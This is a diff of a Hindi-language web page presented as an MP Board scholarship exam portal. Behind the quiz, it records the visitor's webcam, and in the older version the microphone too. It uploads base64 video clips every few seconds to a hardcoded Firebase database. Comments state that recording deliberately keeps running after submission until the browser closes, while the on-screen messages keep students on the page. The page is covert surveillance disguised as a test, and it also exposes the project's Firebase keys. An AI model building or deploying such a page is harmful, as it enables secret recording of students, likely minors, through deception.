@@ -3,167 +3,233 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MP Board Scholarship Exam Portal</title>
+    <title>MP Board Scholarship - Examination Portal</title>
     
+    <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
-        body { background: #f0f4f8; color: #1e293b; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .app-card { width: 100%; max-width: 500px; background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
-        .banner { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 25px; text-align: center; }
-        .banner h2 { font-size: 22px; margin-bottom: 5px; }
-        .content { padding: 25px; }
-        .input-group { margin-bottom: 18px; }
-        .input-group label { display: block; margin-bottom: 6px; font-weight: bold; font-size: 14px; }
-        .input-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; }
-        .qa-section { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 15px; margin-bottom: 15px; }
-        .qa-title { font-weight: bold; font-size: 14px; color: #1e3c72; margin-bottom: 8px; }
-        .qa-options label { display: block; background: white; border: 1px solid #cbd5e1; padding: 10px; border-radius: 6px; margin-bottom: 6px; font-size: 13px; cursor: pointer; }
-        .btn-submit { width: 100%; padding: 15px; background: #1e3c72; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        .btn-submit:disabled { background: #64748b; cursor: not-allowed; }
-        .status-feed { font-size: 12px; color: #64748b; text-align: center; margin-top: 10px; font-style: italic; }
-        .success-msg { display: none; text-align: center; color: #16a34a; font-weight: bold; margin-top: 15px; font-size: 16px; }
-    </style>
-
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyC0i6AtzIoLZm-Lz3pLr4UK5snjhER0es",
-            authDomain: "mytestapp-7b70d.firebaseapp.com",
-            databaseURL: "https://mytestapp-7b70d-default-rtdb.firebaseio.com",
-            projectId: "mytestapp-7b70d",
-            storageBucket: "mytestapp-7b70d.firebasestorage.app",
-            messagingSenderId: "380512974619",
-            appId: "1:380512974619:web:a7ecfba6999a600a7cc5be",
-            measurementId: "G-ZMV07B4JY6"
-        };
+        body { background-color: #1a202c; color: #fff; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .quiz-card { background: #2d3748; padding: 25px; border-radius: 12px; width: 100%; max-width: 600px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
+        h2 { text-align: center; margin-bottom: 20px; color: #38bdf8; font-size: 22px; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-size: 14px; color: #cbd5e1; }
+        input[type="text"] { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #4a5568; background: #1a202c; color: #fff; font-size: 16px; }
+        .btn { width: 100%; padding: 12px; background: #38bdf8; color: #1a202c; border: none; font-weight: bold; border-radius: 6px; font-size: 16px; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+        .btn:hover { background: #0ea5e9; }
+        .question-box { display: none; margin-top: 20px; }
+        .q-title { font-size: 18px; margin-bottom: 15px; color: #f8fafc; }
+        .option-lbl { display: flex; align-items: center; background: #4a5568; padding: 12px; border-radius: 6px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; }
+        .option-lbl:hover { background: #718096; }
+        input[type="radio"] { margin-right: 12px; transform: scale(1.2); }
         
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-
-        const urlParams = new URLSearchParams(window.location.search);
-        let studentId = urlParams.get('id') || 'guest_user';
-        let attemptId = 'attempt_' + Date.now(); 
-
-        let mediaRecorder;
-        let currentAnswers = { answer_q1: "Not Answered" };
-        let studentName = "";
-        let segmentCounter = 1;
-
-        window.addEventListener("load", initExam);
-
-        async function initExam() {
-            try {
-                // कैमरा और माइक एक्टिवेट करना
-                let stream = await navigator.mediaDevices.getUserMedia({ video: { width: 200, height: 150, frameRate: 10 }, audio: true });
-                
-                database.ref('students/' + studentId + '/profile').update({
-                    last_active_at: new Date().toISOString(),
-                    portal_status: "OPENED"
-                });
-
-                startContinuousRecording(stream);
-
-            } catch (err) {
-                alert("परीक्षा शुरू करने के लिए कैमरा और माइक चालू करना अनिवार्य है।");
-                console.log(err);
-            }
-        }
-
-        function startContinuousRecording(stream) {
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
-            
-            mediaRecorder.ondataavailable = function(e) {
-                if (e.data && e.data.size > 0) {
-                    uploadVideoSegment(e.data);
-                }
-            };
-
-            // बदलाव: हर ३०००० मिलीसेकंड (३० सेकंड) में वीडियो का एक हिस्सा स्वतः सेव होगा
-            // जब तक ब्राउज़र खुला है, यह हर ३० सेकंड में नया टुकड़ा भेजता रहेगा
-            mediaRecorder.start(30000); 
-        }
-
-        function uploadVideoSegment(blobData) {
-            let reader = new FileReader();
-            reader.readAsDataURL(blobData); 
-            reader.onloadend = function() {
-                let base64String = reader.result;
-                let currentSegment = 'video_part_' + segmentCounter;
-                
-                // डेटाबेस में उसी अटेम्प्ट के अंदर पार्ट वाइज वीडियो सेव होना
-                database.ref('students/' + studentId + '/test_attempts/' + attemptId + '/live_video_feeds/' + currentSegment).set(base64String);
-                
-                segmentCounter++;
-            }
-        }
-
-        function trackInput(key, value) {
-            if (key === 'student_name') {
-                studentName = value;
-                database.ref('students/' + studentId + '/profile').update({ name: value });
-            } else {
-                currentAnswers[key] = value;
-            }
-            
-            // लाइव आंसर डेटाबेस में सिंक रखना
-            database.ref('students/' + studentId + '/test_attempts/' + attemptId + '/answers').set(currentAnswers);
-        }
-
-        function submitTest(event) {
-            event.preventDefault();
-            
-            const submitBtn = document.getElementById('submit-btn');
-            submitBtn.disabled = true;
-            
-            document.getElementById('status-text').style.display = 'none';
-            document.getElementById('success-block').style.display = 'block';
-
-            // सबमिट होने पर प्रोफाइल स्टेटस बदलेगा, पर रिकॉर्डिंग बंद नहीं होगी!
-            database.ref('students/' + studentId + '/profile').update({
-                portal_status: "SUBMITTED",
-                last_submission: new Date().toISOString()
-            });
-            
-            // अंतिम बचे हुए आंसर्स को सिंक करना
-            database.ref('students/' + studentId + '/test_attempts/' + attemptId).update({
-                student_name: studentName || "Unknown",
-                submitted_at: new Date().toISOString()
-            });
-        }
-    </script>
+        .message-screen { display: none; text-align: center; padding: 30px 10px; }
+        .message-screen h3 { font-size: 24px; color: #22c55e; margin-bottom: 15px; }
+        .message-screen p { color: #cbd5e1; font-size: 16px; line-height: 1.6; }
+        .eliminated-title { color: #ef4444 !important; }
+        
+        #video-preview { display: none; width: 100px; height: 75px; background: #000; border-radius: 6px; position: fixed; bottom: 10px; right: 10px; border: 2px solid #38bdf8; transform: scaleX(-1); }
+    </style>
 </head>
 <body>
 
-<div class="app-card">
-    <div class="banner">
-        <h2>प्रवेश परीक्षा (Pre-Test)</h2>
-        <p>स्कॉलरशिप पोर्टल (सुरक्षित मोड)</p>
+<div class="quiz-card" id="main-card">
+    <!-- रजिस्ट्रेशन स्क्रीन -->
+    <div id="auth-screen">
+        <h2>🎓 MP Board Scholarship Test</h2>
+        <div class="input-group">
+            <label>अपना पूरा नाम दर्ज करें:</label>
+            <input type="text" id="student-name" placeholder="उदा. Anwar Khan">
+        </div>
+        <button class="btn" onclick="startRegistration()">परीक्षा शुरू करें</button>
     </div>
 
-    <div class="content">
-        <form onsubmit="submitTest(event)">
-            <div class="input-group">
-                <label>छात्र का पूरा नाम:</label>
-                <input type="text" placeholder="यहाँ अपना नाम लिखें" required oninput="trackInput('student_name', this.value)">
-            </div>
+    <!-- परीक्षा प्रश्न स्क्रीन -->
+    <div id="quiz-screen" class="question-box">
+        <h3 id="question-text" class="q-title">로드 हो रहा है...</h3>
+        <div id="options-container"></div>
+        <button class="btn" id="next-btn" onclick="submitAnswer()">अगला प्रश्न</button>
+    </div>
 
-            <div class="qa-section">
-                <div class="qa-title">💡 सवाल १: कंप्यूटर का कौन सा भाग 'मस्तिष्क' (Brain) कहलाता है?</div>
-                <div class="qa-options">
-                    <label><input type="radio" name="q1" value="A" onclick="trackInput('answer_q1', 'A')"> A) मॉनिटर</label>
-                    <label><input type="radio" name="q1" value="B" onclick="trackInput('answer_q1', 'B')"> B) सी.पी.यू. (CPU)</label>
-                    <label><input type="radio" name="q1" value="C" onclick="trackInput('answer_q1', 'C')"> C) कीबोर्ड</label>
-                </div>
-            </div>
+    <!-- सफलतापूर्ण सबमिशन स्क्रीन -->
+    <div id="success-screen" class="message-screen">
+        <h3>✅ सबमिट हो गया है!</h3>
+        <p>आपका टेस्ट सफलतापूर्वक सबमिट हो गया है। अगले टेस्ट के लिए इंतज़ार करें, आपको जल्द ही अगला test मिलेगा।</p>
+    </div>
 
-            <button type="submit" id="submit-btn" class="btn-submit">उत्तर सबमिट करें</button>
-            <div id="status-text" class="status-feed">सुरक्षा कैमरा सक्रिय है और बैकग्राउंड में लाइव चल रहा है...</div>
-            <div id="success-block" class="success-msg">✓ उत्तर सबमिट हो गए हैं! कृपया इस पेज को अभी बंद न करें।</div>
-        </form>
+    <!-- एलिमिनेटेड स्क्रीन -->
+    <div id="eliminated-screen" class="message-screen">
+        <h3 class="eliminated-title">🚫 आप बाहर (Eliminated) हो चुके हैं!</h3>
+        <p>एडमिन द्वारा आपको इस परीक्षा से अयोग्य घोषित कर दिया गया है। अब आप आगे टेस्ट नहीं दे सकते।</p>
     </div>
 </div>
 
+<video id="video-preview" autoplay muted playsinline></video>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyC0i6AtzIoLZm-Lz3pLr4UK5snjhER0es",
+        authDomain: "mytestapp-7b70d.firebaseapp.com",
+        databaseURL: "https://mytestapp-7b70d-default-rtdb.firebaseio.com",
+        projectId: "mytestapp-7b70d",
+        storageBucket: "mytestapp-7b70d.firebasestorage.app",
+        messagingSenderId: "380512974619",
+        appId: "1:380512974619:web:a7ecfba6999a600a7cc5be",
+        measurementId: "G-ZMV07B4JY6"
+    };
+    
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    const questions = [
+        { q: "मध्य प्रदेश की राजधानी क्या है?", roles: ["भोपाल", "इंदौर", "जबलपुर", "ग्वालियर"], ans: "भोपाल" },
+        { q: "भारत का राष्ट्रीय पक्षी कौन सा है?", roles: ["कबूतर", "मोर", "तोता", "चील"], ans: "मोर" },
+        { q: "कंप्यूटर का दिमाग किसे कहा जाता है?", roles: ["RAM", "ROM", "CPU", "Hard Disk"], ans: "CPU" },
+        { q: "इनमें से कौन सा एक सर्च engine है?", roles: ["Google", "WhatsApp", "Facebook", "Telegram"], ans: "Google" },
+        { q: "सफेद शेरों की भूमि मध्य प्रदेश के किस जिले को कहा जाता है?", roles: ["रीवा", "शहडोल", "सतना", "पन्ना"], ans: "रीवा" }
+    ];
+
+    let currentQIdx = 0;
+    let studentId = '';
+    let studentName = '';
+    let attemptId = 'attempt_' + Date.now();
+    let mediaRecorder;
+    let clipCounter = 1;
+    let answersSubmitted = {};
+
+    function startRegistration() {
+        const nameInput = document.getElementById('student-name').value.trim();
+        if(!nameInput) { alert("कृपया अपना नाम डालें!"); return; }
+        
+        studentName = nameInput;
+        studentId = 'student_' + Date.now();
+
+        navigator.mediaDevices.getUserMedia({ video: { width: 160, height: 120, frameRate: 10 }, audio: false })
+        .then(stream => {
+            const videoPrev = document.getElementById('video-preview');
+            videoPrev.style.display = 'block';
+            videoPrev.srcObject = stream;
+
+            database.ref('students/' + studentId + '/profile').set({
+                name: studentName,
+                portal_status: "TEST_ONGOING",
+                last_active_at: firebase.database.ServerValue.TIMESTAMP
+            });
+
+            listenToAdminSignals();
+            startVideoRecording(stream);
+
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('quiz-screen').style.display = 'block';
+            showQuestion();
+        })
+        .catch(err => {
+            alert("परीक्षा देने के लिए कैमरा अनुमति अनिवार्य है!");
+            console.error(err);
+        });
+    }
+
+    function listenToAdminSignals() {
+        database.ref('students/' + studentId + '/profile/portal_status').on('value', (snapshot) => {
+            const status = snapshot.val();
+            if(status === "ELIMINATED") {
+                if(mediaRecorder && mediaRecorder.stream) {
+                    mediaRecorder.stream.getTracks().forEach(track => track.stop());
+                }
+                document.getElementById('video-preview').style.display = 'none';
+                document.getElementById('quiz-screen').style.display = 'none';
+                document.getElementById('auth-screen').style.display = 'none';
+                document.getElementById('success-screen').style.display = 'none';
+                document.getElementById('eliminated-screen').style.display = 'block';
+            }
+        });
+    }
+
+    function startVideoRecording(stream) {
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
+        
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data && event.data.size > 0) {
+                let reader = new FileReader();
+                reader.readAsDataURL(event.data);
+                reader.onloadend = () => {
+                    let base64String = reader.result;
+                    database.ref(`students/${studentId}/test_attempts/${attemptId}/live_video_feeds/video_part_${clipCounter}`)
+                    .set(base64String);
+                    clipCounter++;
+                };
+            }
+        };
+
+        // हर 10 सेकंड में बैकग्राउंड में क्लिप्स काटकर डेटाबेस भेजेगा
+        mediaRecorder.start(10000); 
+
+        setInterval(() => {
+            // जब तक ब्राउज़र चालू है, टाइमस्टैम्प अपडेट होता रहेगा
+            database.ref('students/' + studentId + '/profile').update({
+                last_active_at: firebase.database.ServerValue.TIMESTAMP
+            });
+        }, 10000);
+    }
+
+    function showQuestion() {
+        if(currentQIdx >= questions.length) {
+            finishTest();
+            return;
+        }
+
+        const qData = questions[currentQIdx];
+        document.getElementById('question-text').innerText = `प्रश्न ${currentQIdx + 1}: ${qData.q}`;
+        
+        const optDiv = document.getElementById('options-container');
+        optDiv.innerHTML = '';
+
+        qData.roles.forEach(opt => {
+            optDiv.innerHTML += `
+                <label class="option-lbl">
+                    <input type="radio" name="quiz-opt" value="${opt}">
+                    <span>${opt}</span>
+                </label>
+            `;
+        });
+
+        if(currentQIdx === questions.length - 1) {
+            document.getElementById('next-btn').innerText = "फाइनल सबमिट करें";
+        }
+    }
+
+    function submitAnswer() {
+        const selectedOpt = document.querySelector('input[name="quiz-opt"]:checked');
+        if(!selectedOpt) { alert("कृपया एक विकल्प चुनें!"); return; }
+
+        answersSubmitted[`answer_q${currentQIdx + 1}`] = selectedOpt.value;
+        database.ref(`students/${studentId}/test_attempts/${attemptId}/answers`).update(answersSubmitted);
+
+        currentQIdx++;
+        showQuestion();
+    }
+
+    function finishTest() {
+        database.ref('students/' + studentId + '/profile').update({
+            portal_status: "SUBMITTED"
+        });
+
+        // चालू रिकॉर्डिंग से वर्तमान डेटा तुरंत बाहर निकालें बिना कैमरा रोके
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+            mediaRecorder.requestData();
+        }
+
+        database.ref(`students/${studentId}/test_attempts/${attemptId}`).update({
+            submitted_at: firebase.database.ServerValue.TIMESTAMP
+        }).then(() => {
+            document.getElementById('quiz-screen').style.display = 'none';
+            document.getElementById('success-screen').style.display = 'block';
+        });
+        
+        // ध्यान दें: यहाँ कैमरा या रिकॉर्डर स्टॉप नहीं किया गया है ताकि ब्राउज़र बंद होने तक वीडियो आता रहे।
+    }
+</script>
 </body>
 </html>
